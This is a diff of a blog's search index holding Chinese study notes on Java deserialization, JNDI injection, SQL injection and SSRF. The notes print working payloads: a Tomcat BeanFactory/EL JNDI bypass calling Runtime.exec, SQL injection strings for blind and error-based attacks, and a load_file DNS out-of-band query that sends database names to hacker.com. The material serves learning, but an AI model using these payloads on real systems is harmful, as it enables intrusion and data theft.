class="keyword">throw</span> (IOException)pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是Loader的getResource方法</span></span><br><span class="line">Resource <span class="title function_">getResource</span><span class="params">(<span class="keyword">final</span> String name, <span class="type">boolean</span> check)</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> URL url;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="comment">//因为name是有完整协议的base就被忽略了，也就是说不受这个base的限制了</span></span><br><span class="line">                url = <span class="keyword">new</span> <span class="title class_">URL</span>(base, ParseUtil.encodePath(name, <span class="literal">false</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">final</span> URLConnection uc;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (check) &#123;</span><br><span class="line">                    URLClassPath.check(url);</span><br><span class="line">                &#125;</span><br><span class="line">                uc = url.openConnection();</span><br><span class="line">                ...</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个循环中遍历urls直到成功加载资源，其中用到的loader就是通过getLoader()获取的。</p>
+<p>这个方法提供了三种Loader，其中FileLoader是在本地上加载的。</p>
+<p>而通用的Loader会有一个url &#x3D; new URL(base, ParseUtil.encodePath(name, false))和url.openConnection()过程，new URL的时候name包含协议的就会忽略前面的base，所以我们传进来的name就是url，他会去到我们期望的url获取资源，这也是我们期望的。</p>
+<p>JarLoader看名字好行可以获取我们准备好的Jar包里的资源，但是有几个问题要处理，传到JarLoader的资源名是资源名在Jar包里的资源名，也就是说不会是一个URL，他会从条目中的地址中查找这个资源，这需要我们实现把这个Jar包的地址放到条目里面(这恶搞地址可以是URL，所以能够出网获取)，这是没办法用fastjson控制的。</p>
+<p>这就需要走到<code>return new Loader(url)</code>的逻辑当中，这需要从<code>urls</code>中获取的<code>url</code>不能是<code>file</code>开头并且得是<code>/</code>结尾的。</p>
+<p>那这个urls是什么时候被设置的呢？是在程序启动的时候被设置的，而且类加载器之间是不同的，所以AppClassLoader和LaunchedURLClassLoader的urls是不同的，而AppClassLoader的urls里的url不回走到通用Loader的逻辑里面，LaunchedURLClassLoader的可以。</p>
+]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Hessian</title>
     <url>/2026/09/03/hessian/</url>
     <content><![CDATA[<p><em><strong>流程分析</strong></em></p>
@@ -643,6 +728,43 @@
       </categories>
   </entry>
   <entry>
+    <title>JDK原生反序列化流程</title>
+    <url>/2026/06/22/jdkserial/</url>
+    <content><![CDATA[<p><em><strong>流程</strong></em></p>
+<p><img src="/2026/06/22/jdkserial/jdk1.png"></p>
+<span id="more"></span>
+
+<p>enbleOverride默认是false，跟进</p>
+<p><img src="/2026/06/22/jdkserial/jdk2.png">Java 原生反序列化数据流的开头固定是魔数和版本号 <strong><code>AC ED 00 05</code></strong>，紧随其后的就是<code>tc</code>，<code>tc</code>指代了反序列化数据的数据类型。115就是java对象。</p>
+<p><img src="/2026/06/22/jdkserial/jdk3.png"></p>
+<p>跟进readOrdinaryObject()</p>
+<p><img src="/2026/06/22/jdkserial/jdk4.png"></p>
+<p>跟进</p>
+<p><img src="/2026/06/22/jdkserial/jdk5.png"></p>
+<p>这次会读第二个字节，这第二个字节机会简单描述这个对象是什么样的类别。</p>
+<p>有四种情况</p>
+<ul>
+<li>第一种 对这个类没有描述</li>
+<li>第二种 这个类已经加载过了，去缓存表里读解析过的类</li>
+<li>第三种 这是个动态代理类</li>
+<li>第四种 就是最常见的情况，就是说这个类是正常的java类</li>
+</ul>
+<p>跟进</p>
+<p><img src="/2026/06/22/jdkserial/jdk6.png"></p>
+<p>readClassDescriptor()这个方法读的就是第二个字节后面的字节，这些字节包含了这个类的各种信息。然后走到resolveClass()，他就会根据类的信息去加载。跟进</p>
+<p><img src="/2026/06/22/jdkserial/jdk7.png"></p>
+<p>可以看到forName的类加载器是通过latestUserDefinedLoader()获取，他会获取当前线程的调用栈中，最近一次出现的、由用户自定义的（非系统&#x2F;核心类库的）类加载器。总的来说就是能够正确的获取类加载器，例如在tomcat中他能获取到webappclassloader。值得一提的是forName指定的类加载器是AppClassLoader的话还是会走双亲委派。也就是说就算是forName他在类加时走的还是类加载器的逻辑，不会说因为forName的源代码使用C&#x2F;C++所以就不走双亲委派了。所以之前Shiro550不能加载数组，就是因为重写了resolveClass走的不是Class.forName()。</p>
+<p><img src="/2026/06/22/jdkserial/jdk8.png"></p>
+<p>类加载完会到readOrdinaryObject，可以看到后续实例化了对象，然后跟进到readSerialData</p>
+<p><img src="/2026/06/22/jdkserial/jdk9.png"></p>
+<p>这里就会调用反序列化对象的readObject了，当然这个类得重写readObject方法。然后就会给对象填充数据了。</p>
+<p>参考文章:<a href="https://www.cnblogs.com/nice0e3/p/14127885.html">https://www.cnblogs.com/nice0e3/p/14127885.html</a></p>
+]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>代码审计</title>
     <url>/2026/07/03/javaseccode/</url>
     <content><![CDATA[<p>这是github上的一个项目:<a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p>
@@ -724,37 +846,131 @@
       </categories>
   </entry>
   <entry>
-    <title>JDK原生反序列化流程</title>
-    <url>/2026/06/22/jdkserial/</url>
-    <content><![CDATA[<p><em><strong>流程</strong></em></p>
-<p><img src="/2026/06/22/jdkserial/jdk1.png"></p>
+    <title>JNDI</title>
+    <url>/2026/06/14/jndi/</url>
+    <content><![CDATA[<p><em><strong>概念</strong></em></p>
+<p>JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录服务</strong>，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。</p>
 <span id="more"></span>
 
-<p>enbleOverride默认是false，跟进</p>
-<p><img src="/2026/06/22/jdkserial/jdk2.png">Java 原生反序列化数据流的开头固定是魔数和版本号 <strong><code>AC ED 00 05</code></strong>，紧随其后的就是<code>tc</code>，<code>tc</code>指代了反序列化数据的数据类型。115就是java对象。</p>
-<p><img src="/2026/06/22/jdkserial/jdk3.png"></p>
-<p>跟进readOrdinaryObject()</p>
-<p><img src="/2026/06/22/jdkserial/jdk4.png"></p>
-<p>跟进</p>
-<p><img src="/2026/06/22/jdkserial/jdk5.png"></p>
-<p>这次会读第二个字节，这第二个字节机会简单描述这个对象是什么样的类别。</p>
-<p>有四种情况</p>
+<p><em><strong>命名服务</strong></em></p>
+<p>命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。</p>
+<p>在命名服务中，有几个重要的概念。</p>
 <ul>
-<li>第一种 对这个类没有描述</li>
-<li>第二种 这个类已经加载过了，去缓存表里读解析过的类</li>
-<li>第三种 这是个动态代理类</li>
-<li>第四种 就是最常见的情况，就是说这个类是正常的java类</li>
+<li><strong>Bindings</strong>：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。</li>
+<li><strong>Context</strong>：上下文，一个上下文中对应着<strong>一组名称到对象的绑定关系</strong>，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。</li>
+<li><strong>References</strong>：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C&#x2F;C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>
 </ul>
+<p><em><strong>目录服务</strong></em></p>
+<p>简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。</p>
+<p>一些常见的目录服务有：</p>
+<ul>
+<li>LDAP： 轻型目录访问协议</li>
+<li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li>
+<li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li>
+</ul>
+<p>JDK 中包含了下述内置的命名目录服务:</p>
+<ul>
+<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
+<li>LDAP: 轻量级目录访问协议</li>
+<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
+<li>DNS（域名转换协议）</li>
+</ul>
+<p>可以这样理解，用jndi进行的操作相当于在相对应的命名服务或者是目录服务上进行操作，这个jndi就是统一了对于各种命名服务或目录服务的操作。</p>
+<p><em><strong>JNDI+RMI</strong></em></p>
+<blockquote>
+<p>&lt;jdk8u121</p>
+</blockquote>
+<p>一路跟进lookup看一下</p>
+<p><img src="/2026/06/14/jndi/jndi1.png" alt="截图"></p>
+<p><img src="/2026/06/14/jndi/jndi2.png" alt="截图"></p>
+<p><img src="/2026/06/14/jndi/jndi3.png" alt="截图"></p>
+<p><img src="/2026/06/14/jndi/jndi4.png" alt="截图"></p>
+<p>最后可以看到他调用的是RegistryImpl_Stub的lookup方法，也就是说他跟rmi是没有区别的，rmi的所有漏洞他都可以用上。</p>
+<p>下面看一下jndi的利用方法。</p>
+<p><img src="/2026/06/14/jndi/jndi5.png" alt="截图"></p>
+<p>这个操作就是让remoteObj这个名字对应refObj。</p>
+<p>Reference的三个参数是，类名，工厂名，工厂地址，这个类名就是我们实际要加载的类。</p>
+<p>下面我们看一下rebind方法</p>
+<p><img src="/2026/06/14/jndi/jndi6.png" alt="截图"></p>
+<p>obj被encode了，看一下encodeObject()</p>
+<p><img src="/2026/06/14/jndi/jndi7.png" alt="截图"></p>
+<p>obj是reference就包装成ReferenceWrapper()</p>
+<p>下面看一下lookup的过程</p>
+<p><img src="/2026/06/14/jndi/jndi8.png" alt="截图"></p>
+<p>接收的obj是ReferenceWrapper所以要decode</p>
+<p><img src="/2026/06/14/jndi/jndi9.png" alt="截图"></p>
 <p>跟进</p>
-<p><img src="/2026/06/22/jdkserial/jdk6.png"></p>
-<p>readClassDescriptor()这个方法读的就是第二个字节后面的字节，这些字节包含了这个类的各种信息。然后走到resolveClass()，他就会根据类的信息去加载。跟进</p>
-<p><img src="/2026/06/22/jdkserial/jdk7.png"></p>
-<p>可以看到forName的类加载器是通过latestUserDefinedLoader()获取，他会获取当前线程的调用栈中，最近一次出现的、由用户自定义的（非系统&#x2F;核心类库的）类加载器。总的来说就是能够正确的获取类加载器，例如在tomcat中他能获取到webappclassloader。值得一提的是forName指定的类加载器是AppClassLoader的话还是会走双亲委派。也就是说就算是forName他在类加时走的还是类加载器的逻辑，不会说因为forName的源代码使用C&#x2F;C++所以就不走双亲委派了。所以之前Shiro550不能加载数组，就是因为重写了resolveClass走的不是Class.forName()。</p>
-<p><img src="/2026/06/22/jdkserial/jdk8.png"></p>
-<p>类加载完会到readOrdinaryObject，可以看到后续实例化了对象，然后跟进到readSerialData</p>
-<p><img src="/2026/06/22/jdkserial/jdk9.png"></p>
-<p>这里就会调用反序列化对象的readObject了，当然这个类得重写readObject方法。然后就会给对象填充数据了。</p>
-<p>参考文章:<a href="https://www.cnblogs.com/nice0e3/p/14127885.html">https://www.cnblogs.com/nice0e3/p/14127885.html</a></p>
+<p><img src="/2026/06/14/jndi/jndi10.png" alt="截图"></p>
+<p>跟进</p>
+<p><img src="/2026/06/14/jndi/jndi15.png" alt="截图"></p>
+<p>跟进loadClass</p>
+<p><img src="/2026/06/14/jndi/jndi11.png" alt="截图"></p>
+<p>用className找一下肯定是找不到的</p>
+<p><img src="/2026/06/14/jndi/jndi12.png" alt="截图"></p>
+<p>然后用codebase加载，codebase就是reference里面写的那个地址，跟进loadClass()</p>
+<p><img src="/2026/06/14/jndi/jndi13.png" alt="截图"></p>
+<p>用了URLClassLoader()，他可以出网加载类。跟进</p>
+<p><img src="/2026/06/14/jndi/jndi14.png" alt="截图"></p>
+<p>这次就可以加载了，而且这个forName的参数里有true也就是说是会初始化的。这样我们就可以执行我们的恶意代码了。</p>
+<p>而且也可以知道类的初始化不是在RegistryContext执行的，也就是说其他的协议也可以利用这个漏洞。</p>
+<p><em><strong>JNDI+LDAP</strong></em></p>
+<blockquote>
+<p>&lt;jdk8u191</p>
+</blockquote>
+<p>起一个LDAP服务，跟之前RMI一样用Reference帮一下就好了，然后看一下lookup的过程</p>
+<p><img src="/2026/06/14/jndi/jndi22.png" alt="截图"></p>
+<p>一直跟进lookup就好了</p>
+<p><img src="/2026/06/14/jndi/jndi16.png" alt="截图"></p>
+<p>会走到LdapCtx</p>
+<p><img src="/2026/06/14/jndi/jndi17.png" alt="截图"></p>
+<p>在这个方法里面会走到这里decodeObject跟进</p>
+<p><img src="/2026/06/14/jndi/jndi18.png" alt="截图"></p>
+<p>这一长串的if判断是在根据获得的atters进行操作，如果说序列化数据就反序列化，如果是远程对像就decode远程对象，如果是Reference就decodeReference。</p>
+<p><img src="/2026/06/14/jndi/jndi19.png" alt="截图"></p>
+<p>解析玩reference以后走到这里，跟进</p>
+<p><img src="/2026/06/14/jndi/jndi20.png" alt="截图"></p>
+<p>跟进</p>
+<p><img src="/2026/06/14/jndi/jndi21.png" alt="截图"></p>
+<p>用名字在本地找一下，找不到，然后用codebase，总之跟RMI一模一样。</p>
+<p><em><strong>高版本绕过</strong></em></p>
+<blockquote>
+<p>&gt;jdk8u191 下面这个绕过方法需要tomcat8且 &lt;8.5.79</p>
+</blockquote>
+<p>在高版本下是不支持远程加载类的，可以看一下代码。</p>
+<p><img src="/2026/06/14/jndi/jndi23.png" alt="截图"></p>
+<p>可以看到，跟之前比起来多了个判断，这个trustURLCodebase默认是false，所以这个if判断会走到else，也就是说没有加载类。</p>
+<p>远程加载不行了，所以就想了个本地加载的方法。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;)&quot;</span>));</span><br><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, ref);</span><br></pre></td></tr></table></figure>
+
+<p>总的来说就是factory用的是BeanFactory，然后用el表达式来调用恶意代码。</p>
+<p>先来了解一下ResourceRef是什么</p>
+<p>ResourceRef时Reference的子类，也就是他两是继承关系。</p>
+<p><img src="/2026/06/14/jndi/jndi28.png" alt="截图"></p>
+<p>出了在创建Reference用到的参数以外，其余的参数放进了StringRefaddr以后add了。我们看一下Reference类</p>
+<p><img src="/2026/06/14/jndi/jndi29.png" alt="截图"></p>
+<p>这个类有四个成员变量，有三个我们已经很熟悉了，这个addrs是这次第一次用的，add存储到的地方就是这里。他这里存储的就是工厂会用到的其余的参数，这些参数是以键值对的形式存在的。这样就大概了解这个恶意代码的意思了。</p>
+<p>看一下流程</p>
+<p><img src="/2026/06/14/jndi/jndi24.png" alt="截图"></p>
+<p>前面都一样，进入这个方法开始不一样了，可以看到本地加载成功了。</p>
+<p><img src="/2026/06/14/jndi/jndi25.png" alt="截图"></p>
+<p>之前是在远程加载factory的时候调用了恶意代码，不走到这里就结束利用了，而这次不一样，会调用到工厂的getObjectInstance方法，这个方法就是根据reference提供的参数实例化一个类。我们跟进去看一下。</p>
+<p><img src="/2026/06/14/jndi/jndi26.png" alt="截图"></p>
+<p>一上来就是一个if判断，这个判断得满足<code>obj instanceof ResourceRef</code>所以用的是这个类。</p>
+<p>下面具体分析一下这个方法的逻辑。</p>
+<p>加载Reference提供的要加载的类，在我们的代码中就是<code>ELProcessor</code></p>
+<p><img src="/2026/06/14/jndi/jndi27.png" alt="截图"></p>
+<p>可以看到后续还把这个类给实例化了，然后拿键为forceString键值对，如果这个值里有&#x3D;的话,setterName就是等号后面的部分，在我们这个代码中就是eval了。正常情况应该是某个set方法。</p>
+<p><img src="/2026/06/14/jndi/jndi30.png" alt="截图"></p>
+<p>将这个等号的前面部分和反射获取的方法存到forced。</p>
+<p><img src="/2026/06/14/jndi/jndi31.png" alt="截图"></p>
+<p>遍历reference存着的键值对，这个键值对的建不能是if判断里面的这几个，所以我们的恶意代码中只有键为x的部分会通过，value就是这个键值对的值部分。从force中拿出方法，然后invoke调用了。</p>
+<p>后面就是el表达式的解析以及调用了。</p>
+<p>总结一下</p>
+<p>这个BeanFactory，会把reference指定类给加载并实例化，反射获取指定类的，键值对中键为forceString，值里面有&#x3D;的&#x3D;后面部分写的方法。这个方法的参数从键跟&#x3D;的前面部分一样的键值对的值部分获取，最后调用。</p>
+<p>选择BeanFactory是因为他有动态性，会反射调用。</p>
+<p>选择el表达式是因为这个表达式的参数只需提供字符串。</p>
+<p>推荐视频:<a href="https://www.bilibili.com/video/BV1P54y1Z7Lf/?spm_id_from=333.1387.upload.video_card.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1P54y1Z7Lf/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
+<p>参考文章:<a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p>
 ]]></content>
       <categories>
         <category>Java安全</category>
@@ -1418,24 +1634,34 @@
       </categories>
   </entry>
   <entry>
+    <title>spring</title>
+    <url>/2026/06/18/spring/</url>
+    <content><![CDATA[<span id="more"></span>
+
+]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>sql</title>
     <url>/2026/06/11/sql/</url>
-    <content><![CDATA[<p>总的来说就是字符串的拼接字符串</p>
+    <content><![CDATA[<p>总的来说就是字符串的拼接字符串，还有一点比较重要的是AND是优先于OR的。</p>
 <span id="more"></span>
 
 
 <p><em><strong>测试有没有sql注入</strong></em></p>
-<p>’ 报错说明有三个‘ 可以字符串拼接</p>
-<p>‘ and 1&#x3D;1 正常 and前面得是true</p>
-<p>‘ and 1&#x3D;2 异常 and前面得是true</p>
+<p><code>’ </code>报错说明有三个<code>‘ </code>可以字符串拼接</p>
+<p><code>‘ and 1=1 </code>正常 and前面得是true</p>
+<p><code>‘ and 1=2 </code>异常 and前面得是true</p>
 <p>这样说明页面可控，就可能有sql注入漏洞</p>
 <p>万能密码:<code>1&#39; or &#39;1&#39; = &#39;1</code></p>
 <p>union select联合查询:</p>
-<p>select first_name from user_system_data union select login_count from user_data;</p>
+<p><code>select first_name from user_system_data union select login_count from user_data;</code></p>
 <p>联合查询要满足两个条件</p>
 <p>1.union前面select的数量和union后面select的数量要相同。</p>
-<p>也就是说select 1，2 from user union select 3，4 from password； 这样是可以的</p>
-<p>select 1，2，3 from user union select 4，5 from password； 这样是不行的</p>
+<p>也就是说<code>select 1，2 from user union select 3，4 from password；</code> 这样是可以的</p>
+<p><code>select 1，2，3 from user union select 4，5 from password；</code> 这样是不行的</p>
 <p>2.查询的数据类型要相匹配</p>
 <p>可以是用order by来查清楚union前面select了几个。</p>
 <p>order by后面是可以写数字的，数字代表了第几列。</p>
@@ -1447,7 +1673,7 @@
 <p><strong>database()</strong>：获取当前数据库名。</p>
 <p><strong>user()</strong>：获取当前数据库用户名。</p>
 <p><strong>version()</strong>：获取数据库版本。</p>
-<p>SELECT id, title, content FROM articles WHERE id &#x3D; 1 UNION SELECT 1, database(), version()– -</p>
+<p><code>SELECT id, title, content FROM articles WHERE id = 1 UNION SELECT 1, database(), version()-- -</code></p>
 <p>group_concat():联合查询的时候如果只显示一行的话就可以用这个函数，他会列指定的列里数据全部以一行的形式展示出来（其实不是全部由大小限制）。</p>
 <p>concat():主要用处是：<strong>把多个列的数据或者字符串，首尾相连地拼成一个大字符串。</strong></p>
 <p>网页通常只有一个显示位，黑客如果用了 UNION SELECT，一次只能看一个字段。如果黑客既想看用户名，又想看密码，难道要查两次吗？</p>
@@ -1478,14 +1704,14 @@
 <p>SUBSTRING(字符串, 开始位置, 截取长度)</p>
 <p>布尔型：</p>
 <p>虽然不会显示数据但会显示是否正常。</p>
-<p>所以说我们可以将要查询的一个字母一个字母的爆破，爆破对了她就会显示正常，错了就显示失败了。</p>
-<p>SELECT * FROM users WHERE id &#x3D; ‘1’ AND ascii(substr(database(),1,1)) &gt; 100 –+’</p>
+<p>所以说我们可以将要查询的一个字母一个字母的爆破，爆破对了就会显示正常，错了就显示失败了，因为用的是AND不要忘了AND的前面部分得是true。</p>
+<p><code>SELECT * FROM users WHERE id = &#39;1&#39; AND ascii(substr(database(),1,1)) &gt; 100 --+&#39;</code></p>
 <p>可以通过二分发爆破出数据库的第一个字母，以此类推。and前面部分保证是正确的。</p>
-<p>ascii就是把它转换成ascii码，这样能避免使用‘（不用ascii的话就得跟字母比较就得写成‘a了），防火墙可能会把’给挡掉。</p>
+<p>ascii就是把它转换成ascii码，这样能避免使用<code>‘</code>（不用ascii的话就得跟字母比较就得写成‘a了），防火墙可能会把’给挡掉。</p>
 <p>时间型:</p>
 <p>他的回答不会因为是否正确而改变的话，可以这样写：</p>
-<p>– 问数据库：如果数据库名字的第一个字母是 ‘s’，你就给我睡 5 秒，否则返回 0</p>
-<p>?id&#x3D;1’ AND IF(substr(database(),1,1)&#x3D;’s’, sleep(5), 0) –+</p>
+<p>问数据库：如果数据库名字的第一个字母是 ‘s’，你就给我睡 5 秒，否则返回 0</p>
+<p><code>?id=1&#39; AND IF(substr(database(),1,1)=&#39;s&#39;, sleep(5), 0) --+</code></p>
 <p><em><strong>报错注入</strong></em></p>
 <p>黑客故意输入错误的语法，强行引发数据库报错；但黑客在这段语法里塞了“私货”（比如查密码的命令），导致数据库在报错信息中，不小心把黑客想要的秘密给一起打印在屏幕上了。</p>
 <p>要想使用这个漏洞需要满足两个条件:</p>
@@ -1493,20 +1719,20 @@
 <p><strong>利用了特定函数的逻辑漏洞：</strong> 数据库中有些函数，当接收到不符合规范的参数时，会把<strong>这个参数的内容</strong>直接放进报错信息里弹出来。</p>
 <p>updatexml(参数1, 参数2, 参数3):其中<strong>第二个参数</strong>要求必须是一个合法的 <strong>XPath 格式路径</strong>（类似于文件夹路径，比如 &#x2F;root&#x2F;user)</p>
 <p>– 故意制造路径错误的 Payload,塞进一个<strong>绝对不符合 XPath 路径规范的特殊字符</strong>（比如波浪号 ~），紧接着在后面拼接上想偷的数据（如 database()）。</p>
-<p>?id&#x3D;1’ AND updatexml(1, concat(‘~’, database()), 1) –+</p>
+<p><code>?id=1&#39; AND updatexml(1, concat(&#39;~&#39;, database()), 1) --+</code></p>
 <p>数据库会这样回答:ERROR 1105 (HY000): XPATH syntax error: ‘~security’</p>
-<p>?id&#x3D;1’ AND updatexml(1, concat(‘~’, (SELECT table_name FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 0,1)), 1) –+可以这么用</p>
+<p><code>?id=1&#39; AND updatexml(1, concat(&#39;~&#39;, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)), 1) --+</code>可以这么用</p>
 <p><strong>updatexml 报错注入，报错的回显最多为32位</strong></p>
 <p>extractvalue(XML_document，xpath_string)这个也一样</p>
 <p>1 or (extractvalue(1,concat(‘～’,(这里填写sql语句))))</p>
-<p>带外sql注入</p>
+<p><em><strong>带外sql注入</strong></em></p>
 <p>当网站做到了极致的防御：网页上<strong>不显示任何数据</strong>（无法 Union），<strong>不显示任何报错</strong>（无法报错注入），甚至还加了<strong>严格的频率限制</strong>（一旦你用盲注高频猜解，IP立刻被拉黑）。</p>
 <p>这时候，黑客就会利用<strong>带外通道</strong>：让受害服务器的数据库<strong>自己主动联网，把数据发送到黑客掌控的另一台外部服务器上</strong>。</p>
 <p>利用数据库自带的、可以发起网络请求的内置函数。最常被用来建立这种“带外通道”的协议是 <strong>DNS（域名系统）</strong>。</p>
 <p>MySQL 数据库在 Windows 服务器环境下（必须是windows）</p>
 <p>在 Windows 系统中，如果你尝试访问一个形如 \xxx.com\abc 的网络共享路径（称为 UNC 路径），系统为了解析 xxx.com 在哪里，会<strong>强制发送一个 DNS 请求</strong>。 MySQL 的 load_file() 函数正好支持读取网络路径。</p>
 <p>控制了hacker.com</p>
-<p>?id&#x3D;1’ AND load_file(concat(‘\\‘, (SELECT database()), ‘.hacker.com\abc’)) —+(在 SQL 语法中，<strong>反斜杠 \ 是一个特殊的“转义符”</strong>。它的作用是改变紧跟在它后面的那个字符的原本含义。 例如：&#39; 意味着“这只是一个普通的单引号字符，不是字符串的边界”。所以写了四个)</p>
+<p><code>?id=1&#39; AND load_file(concat(&#39;\\\\&#39;, (SELECT database()), &#39;.hacker.com\\abc&#39;)) --+</code>(在 SQL 语法中，<strong>反斜杠 \ 是一个特殊的“转义符”</strong>。它的作用是改变紧跟在它后面的那个字符的原本含义。 例如：&#39; 意味着“这只是一个普通的单引号字符，不是字符串的边界”。所以写了四个)</p>
 <p>concat会讲它拼成\数据库名称.<a href="http://hacker.com/">hacker.com</a>\abc</p>
 <p>load_file() 尝试去读取这个路径。为了找到这个路径，受害服务器开始查 DNS。</p>
 <p>解释一下DNS解析：</p>
@@ -1562,6 +1788,25 @@
       </categories>
   </entry>
   <entry>
+    <title>SSRF 服务端请求伪造</title>
+    <url>/2026/06/09/ssrf/</url>
+    <content><![CDATA[<p>SSRF是一种攻击模式。</p>
+<span id="more"></span>
+<p>我觉得就是让对方的服务器当代理，访问内网中的服务器。<br>正常情况下，对方内网中不让外网访问的服务器是访问不了的，但是web服务器啥的肯定可以访问，而这个web服务器是否可以畅通无阻的与内网当中的各种服务器交流呢。在可以交流的前提下，这个web服务器有ssrf漏洞的话，就可以让攻击者访问到内网中的其他服务器了。</p>
+<p>写的比较短以后进行补充。</p>
+<p>参考文章:</p>
+<p><a href="https://drun1baby.top/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/">https://drun1baby.top/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SSRF</tag>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Tomcat类加载</title>
     <url>/2026/06/12/tomcatcl/</url>
     <content><![CDATA[<blockquote>
@@ -1602,16 +1847,6 @@
 <p>如果webappclasloader没有加载类或者没用上这个的话，就会走到上面两张图的逻辑，可以看到他们都用了Class.forname，所以说这种数组类不能加载的情况要发生，还得是使用的类加载器得是webappclasloader这种情况。</p>
 <p>推荐视频: <a href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.1387.upload.video_card.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
 <p>参考文章:<a href="https://cloud.tencent.com/developer/article/2449663">https://cloud.tencent.com/developer/article/2449663</a></p>
-]]></content>
-      <categories>
-        <category>Java安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>spring</title>
-    <url>/2026/06/18/spring/</url>
-    <content><![CDATA[<span id="more"></span>
-
 ]]></content>
       <categories>
         <category>Java安全</category>
@@ -1755,25 +1990,6 @@
       </categories>
   </entry>
   <entry>
-    <title>SSRF 服务端请求伪造</title>
-    <url>/2026/06/09/ssrf/</url>
-    <content><![CDATA[<p>SSRF是一种攻击模式。</p>
-<span id="more"></span>
-<p>我觉得就是让对方的服务器当代理，访问内网中的服务器。<br>正常情况下，对方内网中不让外网访问的服务器是访问不了的，但是web服务器啥的肯定可以访问，而这个web服务器是否可以畅通无阻的与内网当中的各种服务器交流呢。在可以交流的前提下，这个web服务器有ssrf漏洞的话，就可以让攻击者访问到内网中的其他服务器了。</p>
-<p>写的比较短以后进行补充。</p>
-<p>参考文章:</p>
-<p><a href="https://drun1baby.top/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/">https://drun1baby.top/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
